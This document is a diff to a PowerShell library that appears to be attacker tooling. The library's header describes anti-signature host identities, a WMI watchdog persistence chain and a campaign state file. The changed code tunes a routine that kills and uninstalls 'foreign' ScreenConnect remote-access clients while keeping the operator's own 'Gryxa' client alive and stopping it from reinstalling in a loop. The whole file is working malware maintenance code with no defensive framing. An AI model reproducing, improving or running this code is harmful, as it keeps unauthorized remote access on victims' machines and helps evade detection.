@@ -1,8 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L17
+# OWN_LIB  BUILD 20260802L18
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L18: exterminate was KILLING Gryxa (null-path proc kill); sync FP before kill.
 # L17: Gryxa reinstall LOCK while any non-sevrz SC Running; FP drift never /x.
 # L16: NEVER reinstall Gryxa when Running (panel duplicates); TCP advisory only.
 # L15: gryxa-health / gryxa-ensure — 8h deep check (TCP/relay/FP drift reinstall).
@@ -361,8 +362,22 @@ function Set-GryxaFp([string]$Fingerprint) {
 }
 
 function Get-KeepFingerprints {
-    $g = Get-GryxaFp
-    @('5f6010579852e507', 'f861c8140d453427', $g) | Select-Object -Unique
+    $set = New-Object 'System.Collections.Generic.HashSet[string]' ([StringComparer]::OrdinalIgnoreCase)
+    [void]$set.Add('5f6010579852e507')
+    [void]$set.Add('f861c8140d453427')
+    [void]$set.Add((Get-GryxaFp))
+    # O41: any live/starting non-sevrz SC is a keeper (never exterminate as foreign)
+    foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
+        if ($svc.Status -notin @('Running', 'StartPending', 'ContinuePending')) { continue }
+        if ($svc.Name -match '\(([0-9a-f]{16})\)') {
+            $fp = $matches[1].ToLower()
+            if ($fp -notin $script:SevrzKeep) {
+                [void]$set.Add($fp)
+                Set-GryxaFp $fp
+            }
+        }
+    }
+    return @($set)
 }
 
 function Test-TcpHostPort([string]$HostName, [int]$Port = 443, [int]$TimeoutMs = 8000) {
@@ -464,12 +479,12 @@ function Test-ScDir([string]$Fingerprint) {
 }
 
 function Find-RunningGryxaFp {
-    # ANY non-sevrz ScreenConnect Client that is Running counts as Gryxa.
+    # ANY non-sevrz ScreenConnect Client that is Running/starting counts as Gryxa.
     # Do NOT require relay-string scan (false negatives caused reinstall loops).
     $cfg = Get-GryxaFp
     if (Test-ScRunning $cfg) { return $cfg }
     foreach ($svc in (Get-Service -Name 'ScreenConnect Client*' -ErrorAction SilentlyContinue)) {
-        if ($svc.Status -ne 'Running') { continue }
+        if ($svc.Status -notin @('Running', 'StartPending', 'ContinuePending')) { continue }
         if ($svc.Name -match '\(([0-9a-f]{16})\)') {
             $fp = $matches[1].ToLower()
             if ($fp -in $script:SevrzKeep) { continue }
@@ -731,13 +746,30 @@ function Invoke-GryxaEnsure {
 function Invoke-Exterminate {
     # L7: true removal. Correct WOW6432Node hive + msiexec + UninstallString
     # fallback + force dir nuke. Keep sevrz+alt+current gryxa FP (gryxa.cfg).
+    # O41: sync Running Gryxa FP into cfg BEFORE any kill; never kill SC procs
+    # without a foreign FP in path/cmdline (null path was killing Gryxa every tick).
     $log = Join-Path $WorkDir 'exterminate.log'
+    $runningG = Find-RunningGryxaFp
+    if ($runningG) { Set-GryxaFp $runningG }
     $keep = @(Get-KeepFingerprints)
     $n = @{ svc = 0; proc = 0; dir = 0; product = 0; rmm = 0; fail = 0 }
     function Log([string]$m) {
         $line = '{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m
         Add-Content -LiteralPath $log -Value $line -ErrorAction SilentlyContinue
-        Write-Output $line
+        # O41: do NOT Write-Output Log lines (pollutes for /f callers)
+    }
+    # Protect Gryxa during start race: any live SC process whose path embeds a
+    # non-sevrz FP is a keeper even if the service is not Running yet.
+    Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
+        $blob = "$([string]$_.ExecutablePath) $([string]$_.CommandLine)"
+        if ($blob -match 'ScreenConnect Client \(([0-9a-fA-F]{16})\)') {
+            $fp = $Matches[1].ToLower()
+            if ($fp -notin $script:SevrzKeep -and $fp -notin $keep) {
+                $keep += $fp
+                Set-GryxaFp $fp
+                Log "keep_add_from_proc fp=$fp"
+            }
+        }
     }
     function Is-Keeper([string]$s) {
         if (-not $s) { return $false }
@@ -823,15 +855,21 @@ function Invoke-Exterminate {
         $n.svc++; Log "svc_deleted $($svc.Name)"
     }
 
-    # 3. foreign SC processes (kill even when ExecutablePath is null)
+    # 3. foreign SC processes — ONLY if path/cmdline embeds a NON-keeper FP.
+    # O41: null ExecutablePath used to kill Gryxa ClientService every tick → reinstall loop.
     Get-CimInstance Win32_Process -Filter "Name like 'ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
-        $exe = $_.ExecutablePath
-        $cmd = $_.CommandLine
-        $keeper = (Is-Keeper $exe) -or (Is-Keeper $cmd)
-        if (-not $keeper) {
-            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-            $n.proc++; Log "proc_killed pid=$($_.ProcessId) exe=$exe"
+        $exe = [string]$_.ExecutablePath
+        $cmd = [string]$_.CommandLine
+        $blob = "$exe $cmd"
+        if (Is-Keeper $blob) { return }
+        if ($blob -notmatch '\(([0-9a-fA-F]{16})\)') {
+            Log "proc_skip_no_fp pid=$($_.ProcessId) name=$($_.Name)"
+            return
         }
+        $fp = $Matches[1].ToLower()
+        if ($fp -in $keep) { return }
+        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+        $n.proc++; Log "proc_killed pid=$($_.ProcessId) fp=$fp exe=$exe"
     }
 
     # 4. foreign SC install dirs (PF + PF86)
